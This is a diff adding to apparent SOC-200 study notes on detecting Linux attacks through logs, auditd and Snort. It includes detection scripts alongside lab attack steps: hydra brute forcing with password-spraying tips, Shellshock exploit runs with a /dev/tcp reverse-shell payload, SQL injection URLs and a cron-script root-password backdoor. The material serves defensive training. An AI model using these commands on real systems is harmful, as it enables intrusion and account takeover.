@@ -253,6 +253,8 @@ Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].v
 
 ```bash
 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.51.50
+
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null offsec@192.168.51.12
 ```
 
 ```pwsh
@@ -1272,7 +1274,7 @@ systemd journal compresses log messages into a binary format, as opposed to the 
 
 Rsyslog has replaced the legacy syslog daemon (syslogd) and comes installed by default on nearly every Linux distribution.
 
-To provide backwards compatibility with older UNIX systems, rsyslog runs in parallel with journal and reads its syslog messages as they arrive. It then processes and saves them to local files or, if configured, remote servers.
+To provide backwards compatibility with older UNIX systems, **rsyslog runs in parallel with journal** and reads its syslog messages as they arrive. It then processes and saves them to local files or, if configured, remote servers.
 
 The journal daemon can run solo or in combination with the rsyslog daemon, based on our configuration needs.
 
@@ -1462,6 +1464,8 @@ sudo cat /var/log/secure | grep "Accepted password"
 sudo cat /var/log/secure | grep "Failed password"
 ```
 
+`sudo python3 ssh_login_check.py`
+
 ```python
 #!/usr/bin/env python
 
@@ -1483,4 +1487,1157 @@ for log_file in ssh_log_files:
 		                print("[*] Valid SSH Login found:\n\t"   + line,end = '')
 		            for match in re.finditer(regex_failed_login, line, re.S):
 		                print("[!] INVALID SSH Login found:\n\t" + line,end = '')
+```
+
+# Linux Server Side Attacks
+
+The SSH password authentication mechanism makes use of the Linux Pluggable Authentication Modules (PAM) library, which is responsible for checking that the password belonging to the requested username corresponds to the one present in the `/etc/shadow` password file.
+
+**Public-key authentication** will be our 1st choice if both it and **password authentication** are enabled and no specific order is configured under the `PreferredAuthentications` directive
+
+```bash
+sudo cat /etc/ssh/sshd_config | grep PasswordAuth
+```
+
+## Suspicious Logins
+
+Public-key authentication works with a key-pair, composed of a public and a private key.
+
+- The entire key-pair is located on the client
+- The server trusts the client by storing only its public key.
+
+During the authentication process, the SSH server first verifies the client's identity through the username and public-key association before sending a random challenge message to the client.
+
+The client then encrypts the server's challenge message with its own private key to send back to the server.
+
+To enable public key authentication on a Linux SSH server,  generate a key-pair on the client host.
+
+```bash
+ssh-keygen -t Ed25519
+```
+
+Private key (`/home/kali/.ssh/id_ed25519`) needs to be kept undisclosed
+
+Public key (`/home/kali/.ssh/id_ed25519.pub`) is going to uploaded to the SSH server.
+
+Copy the public key to the SSH server along with the username we want to associate it with.
+
+```bash
+ssh-copy-id offsec@192.168.51.12
+```
+
+The SSH server trust our local public key, map it to the offsec user, and store it inside the `~/.ssh/authorized_keys` under the offsec user's home folder.
+
+```bash
+ssh offsec@192.168.51.12 -v
+```
+
+Verify the public key authentication configuration section.
+
+```bash
+sudo cat /etc/ssh/sshd_config | grep Pubkey
+```
+
+Password-only authentication: disable the public key authentication option by un-commenting the line as follows.
+
+```bash
+sudo nano /etc/ssh/sshd_config
+...
+PubkeyAuthentication no
+...
+PasswordAuthentication yes
+```
+
+```bash
+sudo systemctl restart sshd
+```
+
+```bash
+sudo tail -f /var/log/auth.log
+```
+
+Public key only authentication:
+
+```bash
+sudo nano /etc/ssh/sshd_config
+...
+PubkeyAuthentication yes
+...
+PasswordAuthentication no
+```
+
+Simulate an invalid public key login:
+
+```bash
+ssh offsec@192.168.51.12  -i .ssh/id_ed25519_rogue
+```
+
+The **preauth** keyword in square brackets => something went wrong in the pre-authentication process.
+
+Increase the **log verbosity** on the SSH server side
+
+```bash
+sudo nano /etc/ssh/sshd_config
+...
+#LogLevel INFO
+LogLevel DEBUG1
+```
+
+An explicit message about the offsec user providing a wrong ED25519 public key while authenticating to the server:
+
+```bash
+sudo tail -f /var/log/auth.log
+```
+
+Both public key and password authentication are enabled
+
+```bash
+sudo nano /etc/ssh/sshd_config
+...
+PubkeyAuthentication yes
+...
+PasswordAuthentication yes
+```
+
+Highlight discrepancies within the logging history
+
+2 principal functions:
+
+- `log_file_parser` parses the log file in search of suspicious and interesting log events,
+
+- `log_line_parser` extrapolates only the critical information such as authentication status, username, and source IP.
+
+Script arguments:
+
+1. The authentication method `log_type` can be either `pubkey`, `password`, or `all`, depending on the event we want to filter.
+
+2. `log_scope` is related to the authentication status and can be either `valid`, `failed`, or `all`.
+
+3. A debugging feature that allows us to translate the original log line in the `verbose` format, or a trimmed down version of it with the `off` option.
+
+`python3 ssh_suspicious_logons.py pubkey failed off`
+
+```python
+#!/usr/bin/env python
+
+import re
+import sys
+import os.path
+
+
+def usage():
+    print("Usage: "   + sys.argv[0] + " [AUTHENTICATION METHOD] [SCOPE] [DEBUG]")
+    print("Usage: "   + sys.argv[0] + " [pubkey|password|all] [valid|failed|all] verbose|off")
+    print("Example: " + sys.argv[0] + " pubkey failed off")
+    sys.exit()
+
+def log_line_parser(line):
+    global debug
+    match0 = re.search('^(...).(..).(..:..:..)',line)
+    match1 = re.search('for(.+?)from', line)
+    match2 = re.search('from(.+?)port', line)
+    match3 = re.search('sshd\[.*\]:(.+?)for',line)
+    timestamp   = match0.group()
+    username    = match1.group(1)
+    ipaddress   = match2.group(1)
+    auth_result = match3.group(1)
+    if debug:
+        print(line,end = '')
+    else:
+        print(timestamp + auth_result + username + ipaddress)
+
+def log_file_parser(log_type,log_scope):
+    centos_ssh_log_file_path = "/var/log/secure"
+    ubuntu_shh_log_file_path = "/var/log/auth.log"
+
+    ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]
+
+    password_valid_login  = 'sshd\[.*\]*Accepted password'
+    password_failed_login = 'sshd\[.*\]*Failed password'
+    pubkey_valid_login    = 'sshd\[.*\]*Accepted publickey'
+    pubkey_failed_login   = 'sshd\[.*\]*Failed publickey'
+
+    for log_file in ssh_log_files:
+        if os.path.isfile(log_file) :
+            with open(log_file, "r") as file:
+                for line in file:
+
+                    if log_scope == 'valid' or log_scope == 'all':
+                        if log_type == 'password' or log_type == 'all':
+                            for match in re.finditer(password_valid_login, line, re.S):
+                                log_line_parser(line)
+                        if log_type == 'pubkey' or log_type == 'all':
+                            for match in re.finditer(pubkey_valid_login, line, re.S):
+                                log_line_parser(line)
+
+                    if log_scope == 'failed' or log_scope == 'all':
+                        if log_type == 'password' or log_type == 'all':
+                            for match in re.finditer(password_failed_login, line, re.S):
+                                log_line_parser(line)
+                        if log_type == 'pubkey' or log_type == 'all':
+                            for match in re.finditer(pubkey_failed_login, line, re.S):
+                                log_line_parser(line)
+
+if __name__ == '__main__':
+    if len(sys.argv) > 3:
+        log_type    = sys.argv[1]
+        log_scope   = sys.argv[2]
+        verbose     = sys.argv[3]
+
+        if verbose == 'verbose':
+            debug = True
+        else:
+            debug = False
+        log_file_parser(log_type,log_scope)
+
+    else:
+        usage()
+```
+
+## Password Brute Forcing
+
+Empty a log file
+
+```bash
+sudo truncate /var/log/auth.log --size 0
+```
+
+```bash
+hydra -l alice -P ./dict_bf.txt  192.168.51.12 -t 1 ssh
+```
+
+```bash
+sudo cat /var/log/auth.log | grep "sshd\["
+```
+
+The `MaxAuthTries` parameter from the SSH config file matches the total number of failed authentication attempts, which then forces the current session to disconnect.
+
+A threshold value has been reached.
+
+**Disconnecting authenticating user alice 192.168.51.50 port 55762: Too many authentication failures [preauth]**
+
+This threshold value could potentially be employed to trigger either firewall rules or `fail2ban` to enact a lockout period for the targeted accounts.
+
+=> Use this warning message as an indicator for triggering account lockouts.
+
+Upgrade the standard brute forcing attack to a password spraying attack by running the attack with a password dictionary sized just below the lockout threshold against every username within a company.
+
+=> not only allow the attacker to stay under the radar, but also increase the chances of guessing the correct password across multiple accounts.
+
+Password spraying is often more effective than expected as password reuse among multiple accounts is not that uncommon.
+
+hydra's `-u` option, allows us to loop first between users as opposed to passwords.
+
+## Command Injection
+
+```bash
+sudo truncate /var/log/apache2/*.log --size 0
+```
+
+```bash
+cat /var/log/apache2/access.log
+```
+
+**Shellshock** allows an attacker to execute system commands via an unintended processing of environment variables.
+
+Showcase a CGI-based web server as a compromised vector, which is already preconfigured on the Apache server running, along with the vulnerable Bash version (4.3).
+
+```bash
+./shellshock.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
+```
+
+```bash
+cat /var/log/apache2/access.log
+```
+
+192.168.51.50 - - [02/Aug/2021:03:57:11 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 151 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"
+
+The last field of the Apache log format is supposed to be the `User-Agent` field, which is suspiciously empty ("-").
+
+The second-to-last field would normally contain the HTTP `Referer` header, but instead, a reverse-shell attack that connects back to the Kali lab machine.
+
+```bash
+sudo ps aux | grep "/bin/bash"
+```
+
+The bash process has been invoked by the `www-data` user, which corresponds to the Apache web server process.
+
+`python3 shellshock_log_detector.py`
+
+```python
+#!/usr/bin/env python
+
+import re
+import os.path
+
+centos_apache_log_file_path = "/var/log/httpd/access_log"
+ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
+ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"
+
+apache_log_files = [centos_apache_log_file_path,ubuntu_apache_log_file_path,ubuntu_custom_log_file_path]
+
+web_log_regex = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\"'
+shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
+for log_file in apache_log_files:
+        if os.path.isfile(log_file) :
+                with open(log_file, "r") as file:
+                    for line in file:
+                        for match in re.finditer(web_log_regex, line, re.S):
+                            log_line = (re.match(web_log_regex, line)).groups()
+                            for match in re.finditer(shellshock_regex, log_line[5], re.S):
+                                if log_line[3] != '200':
+                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
+                                elif log_line[3] == '200':
+                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
+                                    print(log_line)
+```
+
+The Shellshock attack vector embeds the payload inside the `Referer` HTTP Header, but can also store it in any part of the HTTP Request, such as the `Cookie` header, as long as the web server processes it and triggers the vulnerability.
+
+```bash
+./shellshock_cookie.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
+```
+
+```bash
+sudo cat /var/log/apache2/access.log
+```
+
+Surprisingly, we now lack all kinds of evidence around the attacker's Shellshock payload as the `Referer` payload is now empty.
+
+The default Apache logging behavior doesn't save any information about the `Cookie` HTTP header => a stealthier approach.
+
+Integrate the Apache configuration with a custom logging format that supports the Cookie header and saves the log events into a separate file.
+
+Changes needed in the vhost configuration file.
+
+```bash
+cat /etc/apache2/sites-enabled/000-default.conf
+```
+
+```
+<VirtualHost *:80>
+...
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+ 	LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{Cookie}i\" with_cookies
+	CustomLog /var/log/apache2/with_cookies.log with_cookies
+	
+</VirtualHost>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+```
+
+```bash
+cat /var/log/apache2/with_cookies.log
+```
+
+`python3 shellshock_log_detector_cookies.py`
+
+```python
+#!/usr/bin/env python
+
+import re
+import os.path
+
+centos_apache_log_file_path = "/var/log/httpd/access_log"
+ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
+ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"
+
+apache_log_files = [ubuntu_custom_log_file_path]
+
+web_log_regex_cookie = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\" \"(.*?)\"'
+shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
+for log_file in apache_log_files:
+        if os.path.isfile(log_file) :
+                with open(log_file, "r") as file:
+                    for line in file:
+                        for match in re.finditer(web_log_regex_cookie, line, re.S):
+                            log_line = (re.match(web_log_regex_cookie, line)).groups()
+                            for match in re.finditer(shellshock_regex, log_line[7], re.S):
+                                if log_line[3] != '200':
+                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
+                                elif log_line[3] == '200':
+                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
+                                    print(log_line)
+```
+
+## SQL Injection
+
+`https://megacorpone.local/tshirts?color=purple'+UNION+SELECT+username+passwords+FROM+administrators--`
+
+Since the statement `1=1` is always true, the application is going to return the `tshirt_id` only if it exists in the database.
+
+`https://megacorpone.local/tshirt_model=scoop'+AND+1=1`
+
+If the application does not return any kind of output, regardless of whether the query succeeded or not, time-based blind SQL injection can be employed as such:
+
+`https://megacorpone.local/tshirt_model=scoop'+AND+IF(1=1,+sleep(20),+false)`
+
+
+```bash
+sudo truncate /var/log/apache2/*.log --size 0
+```
+
+```bash
+cat /var/log/apache2/access.log
+```
+
+We have the Apache web server already preconfigured with **ModSecurity**.
+
+**ModSecurity** offers detection and prevention capabilities against a number of different web application attack vectors and also provides the ability of increasing the log level to help with investigations.
+
+A special file, named `modsec_audit.log`, is created to store these kinds of events.
+
+Filter out all of the POST requests followed by the next 50 lines.
+
+```bash
+sudo cat /var/log/apache2/modsec_audit.log | awk '/-A--/,/-F--/'
+```
+
+By selectively trimming through the `awk` command the output comprised between the ModSec specific headers, `-A--` (audit log header) and `-F--` (response header), we can now spot the SQL injection payload.
+
+```bash
+sudo cat /var/log/apache2/modsec_audit.log | grep 'detected SQLi'
+```
+
+# Linux Privilege Escalation
+
+## Becoming a User
+
+```bash
+cat /etc/passwd | grep offsec
+```
+
+This file contains information about the target account and can be viewed by any user:
+- Login Name: "offsec" - Indicates the username used for login.
+- Encrypted Password: "x" - This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly).
+- UID: "1000" - Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID.
+- GID: "1000" - Represents the user's specific Group ID.
+- Comment: "offsec,,," - This field generally contains a description about the user, often simply repeating username information.
+- Home Folder: "/home/offsec" - Describes the user's home directory prompted upon login.
+- Login Shell: "/bin/bash" - Indicates the initial directory from which the user is prompted to login.
+
+```bash
+sudo -l
+```
+
+```bash
+su bob
+sudo -l
+```
+
+```bash
+sudo cat /var/log/auth.log | grep "sudo:"
+```
+
+```bash
+sudo cat /etc/shadow
+```
+
+```bash
+sudo cat /var/log/auth.log | grep shadow
+```
+
+`python3 sudo_privesc.py`
+
+```bash
+#!/usr/bin/env python
+
+import re
+import os.path
+
+centos_auth_log_file_path = "/var/log/secure"
+ubuntu_auth_log_file_path = "/var/log/auth.log"
+
+auth_log_files = [centos_auth_log_file_path,ubuntu_auth_log_file_path]
+
+regex_sudo_privesc_attempt = 'sudo:.*command not allowed'
+
+for log_file in auth_log_files:
+        if os.path.isfile(log_file) :
+                with open(log_file, "r") as file:
+                    for line in file:
+                        for match in re.finditer(regex_sudo_privesc_attempt, line, re.S):
+                            print("[*] Found 'sudo' privilege escalation attempt:\n\t"   + line,end = '')
+```
+
+Impersonate the private key's owner by connecting to localhost
+
+```bash
+ssh bob@localhost -i /home/alice/stolen_id_rsa
+```
+
+User alice successfully authenticated through password via SSH and, directly after, the user bob received a valid public-key login via SSH
+
+No hard evidence that alice has actively used the private key to login as bob
+
+```bash
+cat /var/log/auth.log
+```
+
+`aureport` tool efficiently inspects the very detailed logs generated by the audit daemon.
+
+When correctly configured, it can also collect any commands typed by any logged in user, thus acting like a key-logger.
+
+Enable this feature by adding the following line to the `/etc/pam.d/sshd` configuration file.
+
+```
+session required pam_tty_audit.so enable=*
+```
+
+This line instructs the SSH authentication module to enable TTY auditing by relying on the `pam_tty_audit.so` shared library.
+
+`enable=*` activates TTY auditing for any user on the system.
+
+```bash
+sudo systemctl restart auditd
+```
+
+The `-tty` keyword will filter for only TTY events, grouping each event by specific fields to improve readability.
+
+```bash
+sudo aureport --tty
+```
+
+Running the command with the `-tty` option outputs every keystroke pressed.
+
+Beside the evidence of the entire `ssh bob@localhost -i /home/alice/stolen_id_rsa` command, we have visibility of the user ID that actually typed it, which is `1002`.
+
+Confirm this is indeed the user alice:
+
+```bash
+grep alice /etc/passwd
+```
+
+Although this is helpful for gathering real evidence about a user's activities, this approach will **not scale well** in cases which only provide access to the raw audit logs.
+
+=> Inspect the source of the logs, `auditd` logs.
+
+Audit logs are generated by the **Linux Audit Framework**, which is comprised of a kernel module and several user-mode tools that can be combined to inspect events at the system-call level.
+
+User commands are encoded in **hexadecimal**.
+
+Dump the contents of `/var/log/audit/audit.log`, grepping first by "type=TTY" and then further filtering events by alice's UID.
+
+```bash
+sudo cat /var/log/audit/audit.log | grep "type=TTY" | grep " uid=1002"
+```
+
+2 hits on user's 1002 activity; both events have values in the data field.
+
+The `data` field holds the actual keystrokes run by the user, stored in hexadecimal format.
+
+The last hex-represented ASCII value of the string is `0D`, corresponding to to the non-printable **carriage return** character that will break `xxd` functionality if not removed.
+
+=> Use the `sed` tool to replace any occurrence of `0D` with a printable white space value (`20`).
+
+The `-r` option instructs `xxd` to convert values from hexadecimal to binary > Output the data in plain text format with the `-p` parameter.
+
+```bash
+echo "73736820...40D" | sed 's/0D/20/g'  | xxd -r -p
+```
+
+The script inspects each line of the `/var/log/audit/audit.log` file:
+
+`python3 audit_decoder.py 1002`
+
+```python
+#!/usr/bin/env python
+
+import re
+import sys
+import os.path
+import binascii
+
+
+def usage():
+    print("Usage: "   + sys.argv[0] + " [uid]")
+    print("Example: " + sys.argv[0] + " 1001")
+    sys.exit()
+
+
+def log_file_parser(uid):
+        audit_log_file  = "/var/log/audit/audit.log"
+        regex_audit     = "^type=TTY.*"+" uid=" + uid +".*data=.*"
+
+        if os.path.isfile(audit_log_file) :
+                with open(audit_log_file, "r") as file:
+                    for line in file:
+                        for match in re.finditer(regex_audit, line, re.S):
+                            print("[*] Found the following user's audit data belonging to UID:%s" % uid)
+                            encoded_commands = ((line.split("data=")[1])).strip()
+                            decoded_commands = (binascii.a2b_hex(encoded_commands))
+                            print(decoded_commands)
+                            print("---")
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+
+        uid    = sys.argv[1]
+        log_file_parser(uid)
+
+    else:
+        usage()
+```
+
+## Backdooring a User
+
+2 files are responsible for executing aliases and Bash functions (`.bashrc`) and setting environmental variables (`.profile`); both are executed upon every new SSH login.
+
+```bash
+ls -asl /home/bob/.bashrc
+```
+
+```bash
+echo 'echo "hello from bob .bashrc"' >> /home/bob/.bashrc
+```
+
+```bash
+ssh bob@192.168.51.12
+```
+
+Run the `auditctl` command to watch (`-w`) the 2 configuration files for any write and attribute change operation (`wa`), and we'll assign the 'privesc' keyword for later look-up
+
+```bash
+sudo auditctl -w /home/bob/.bashrc  -p wa -k privesc
+sudo auditctl -w /home/bob/.profile -p wa -k privesc
+```
+
+Verify that the rules are validated and in effect
+
+```bash
+sudo auditctl -l
+```
+
+Audit rules configured through auditctl will not be persistent across reboots. To make them permanent, rules have to be added to the `/etc/audit/rules.d/audit.rules` file.
+
+Run the `aureport` tool along with the `-k` option to filter based on key value, in our case "privesc".
+
+```bash
+sudo aureport -k
+```
+
+```
+1. 08/30/21 07:29:46 privesc yes /usr/sbin/auditctl 1000 232
+2. 08/30/21 07:29:51 privesc yes /usr/sbin/auditctl 1000 239
+3. 08/30/21 07:44:20 privesc yes /home/offsec/SOC-200/Linux_Server_Side_Attacks/Shellshock/bash-4.3/bash 1002 287
+```
+
+The first two lines of the report are referring to the `auditctl` rules we performed as the offsec user (auid `1000`).
+
+The third event stating that the executable used to access bob's `.bashrc` is a specific version of bash.
+
+We can also pinpoint the exact auid of the user that implanted the backdoor, which is `1002` and thus corresponds to `alice`.
+
+To enhance analysis, the aureport tool supports the `-i` option that interprets user IDs and translates them into **usernames**.
+
+The `auid` value is assigned every time a user logs in and it remains unchanged for the entire session, even if the user impersonates other identities (like becoming root through the `su` or `sudo` commands).
+
+E.g., the user bob managed to elevate to superuser via a privilege escalation technique, and subsequent events are recorded in the audit logs as follows:
+
+```bash
+sudo cat /var/log/audit/audit.log
+```
+
+```
+type=TTY msg=audit(1630395261.553:494): tty pid=3437 uid=0 auid=1001 ses=23 major=136 minor=0 comm="sh" data=636174202F6574632F7061737377640A
+```
+
+`python3 audit_key_search.py privesc`
+
+```python
+#!/usr/bin/env python
+
+import re
+import sys
+import os.path
+import binascii
+
+
+def usage():
+    print("Usage: "   + sys.argv[0] + " [key]")
+    print("Example: " + sys.argv[0] + " privesc")
+    sys.exit()
+
+
+def log_file_parser(keyarg):
+    audit_log_file  = "/var/log/audit/audit.log"
+    regex_audit     = ".*key=\"" + keyarg +"\".*"
+
+    if os.path.isfile(audit_log_file) :
+        with open(audit_log_file, "r") as file:
+            for line in file:
+                for match in re.finditer(regex_audit, line, re.S):
+                    print("[*] Found audit logs based on the following key: %s" % keyarg)
+                    auid        = (line.split("auid=")[1]).split()[0]
+                    event_type  = (line.split("type=")[1]).split()[0]
+                    print("event-type: %s" % event_type)
+                    print("auid: %s" % auid)
+                    try:
+                        exe   = (((line.split("exe=")[1])).strip()).split()[0]  
+                        print("program executed: %s" % exe)               
+                    except(IndexError):
+                        pass
+                    print("---")
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+
+        keyarg    = sys.argv[1]
+        log_file_parser(keyarg)
+
+    else:
+        usage()
+```
+
+## Abusing System Programs
+
+The concept of `UID` (User ID) in relation to files and user activity.
+
+how user identifiers are related to processes, also known as process credentials.
+
+When a user- or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as **real UID/GID**.
+
+The **effective UID/GID** was introduced, which represents the actual value that's being checked when performing sensitive operations.
+
+```bash
+passwd
+ps u -C passwd
+```
+
+The `passwd` program is running as the `root` user: this is needed for it to access and modify the `/etc/shadow` file 
+
+With the passwd PID (2078)
+
+```bash
+grep Uid /proc/2078/status
+```
+
+passwd behaves differently because the binary program has a special flag named Set-User-ID, or SUID 
+
+```bash
+ls -asl /usr/bin/passwd
+```
+
+The SUID flag is depicted as the s flag. This flag sets the effective UID of the running process to the executable owner's user ID, in this case root.
+
+```bash
+chmod u+s <program> 
+```
+
+Since `audit` is running at the kernel level, permanent rules cannot be disabled even by `root`, unless a reboot is performed, an event that should always trigger the incident response team.
+
+configure audit rules to monitor root behavior (Log any activity of processes, either on x86 or x64 architectures, with effective UIDs equal to zero (root) that are also invoking the `execve` system call which is ultimately responsible for executing programs throughout a shell. We have then assigned a common `root_cmds` key for quick lookups)
+
+```bash
+sudo auditctl -a exit,always -F arch=b64 -F euid=0 -S execve -k root_cmds
+sudo auditctl -a exit,always -F arch=b32 -F euid=0 -S execve -k root_cmds
+```
+
+Run the `ausearch` tool, filtering by our custom key and the executable bash. We'll also issue the `-i` option to interpret any numerical value, like UIDs, into usernames, as well as translate timestamps.
+
+```bash
+sudo ausearch -k root_cmds -i -x bash
+```
+
+Detect that the offsec user (tracked by the auid) has become root (euid) and executed the bash shell as superuser.
+
+## Weak Permissions
+
+```bash
+ls -asl /etc/passwd
+```
+
+Multiple cron jobs can be configured on the user's own crontab through the `crontab -e` command.
+
+Inspect preconfigured crontab for the root user
+
+```bash
+sudo crontab -l
+```
+
+`clear_history.py` Python script is scheduled to run every minute with root privileges
+
+```python
+#!/usr/bin/env python3
+import os
+import sys
+try:
+   os.system('cat /dev/null > /home/offsec/.bash_history ')
+except:
+    sys.exit()
+```
+
+```bash
+ls -asl /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/clear_history.py
+```
+
+modify the `clear_history.py` script by adding the following statement in the try block to change the root password to 'pwnd'
+
+```bash
+os.system("echo 'root:pwnd' | sudo chpasswd")
+```
+
+```bash
+sudo auditctl -w /home/offsec/SOC-200/Linux_Privilege_Escalation/cron_scripts/ -p wa -k cron_scripts
+```
+
+```bash
+sudo ausearch -k cron_scripts -i
+```
+
+- A PROCTITLE event containing the entire command used to modify the script through nano editor.
+- 2 PATH events; one event related to the target file, and the other to the parent folder.
+- A CWD event indicating that the folder from which the command was executed is alice's home folder.
+
+```bash
+python3 audit_key_search.py cron_scripts
+```
+
+A user that obtained root permissions could dump the content of the `/etc/shadow` file and try to perform an offline crack of the hashed root password in order to obtain unrestricted and unlimited access through legitimate channels, such as SSH.
+
+The 2 audit rules that we previously configured to monitor root account activity won't serve our purpose here because only catch `execve` system calls, while dumping a file is done using either the `open` or `openat` system call.
+
+log any write, attribute change, or read access to the file (war) and the etc_shadow look-up key.
+
+```bash
+sudo auditctl -w /etc/shadow -p war -k etc_shadow
+```
+
+retrieve the content of the shadow password file as the root user
+
+```bash
+cat /etc/shadow
+```
+
+```bash
+sudo ausearch -k etc_shadow -c cat -i
+```
+
+# Network Detections
+
+**NetFlow**: understand the activity occurring on a network (produce a metadata-only summary of the network flows.)
+
+There are a few iterations of this mechanism based on **proprietary** tooling, such as Qflow and pFlow, 
+
+Quickly find unusual connections (high data throughput or malicious IP addresses), but not storing any information about the packet payload.
+
+## Intrusion Detection Systems
+
+Snort rules consist of 2 main components: the rule header and the rule options.
+
+The rule header dictates the action to take (usually alert) and then checks any network-related data, such as the transport protocol (TCP, UDP, or ICMP), source and destination ports/IPs, and the direction of the communication.
+
+Rule options are made by 2 sub-categories:
+
+1. General Rule Options provides classification information
+
+2. Detection Options implements the actual detection routine, based on a given pattern.
+
+In order to maximize performance, we will filter the rule headers first.
+
+In this Module lab, the snort01 machine acts as router between the 192.168.51.0/24 subnet, which simulates a public network, and the 172.16.51.0/24 subnet, which serves as a private, internal network.
+
+A simple rule that alerts whenever ICMP traffic is detected on the local network interface Snort is listening to.
+
+The rule below needs to be added in `/usr/local/etc/rules/local.rules` on the snort01 machine, which is already preconfigured with Snort on both network interfaces.
+
+```
+alert icmp $HOME_NET any <> $EXTERNAL_NET any ( msg:"ICMP Traffic Detected"; sid:10000001; metadata:policy security-ips alert;)
+```
+
+alert on ICMP traffic originating from local networks ($HOME_NET) to any external network ($EXTERNAL_NET), in a bidirectional fashion. Next, the rule options, delimited by round brackets, include the log message, the snort id, and the metadata tag.
+
+```bash
+sudo systemctl restart snort3_external
+```
+
+```bash
+ping 192.168.51.40 -c 1
+```
+
+```bash
+cat /var/log/snort/alert_fast.txt
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+# Antivirus Alerts and Evasion
+
+# Network Evasion and Tunneling
+
+# Active Directory Enumeration
+
+# Windows Lateral Movement
+
+# Active Directory Persistence
+
+# SIEM Part One: Intro to ELK
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
 ```
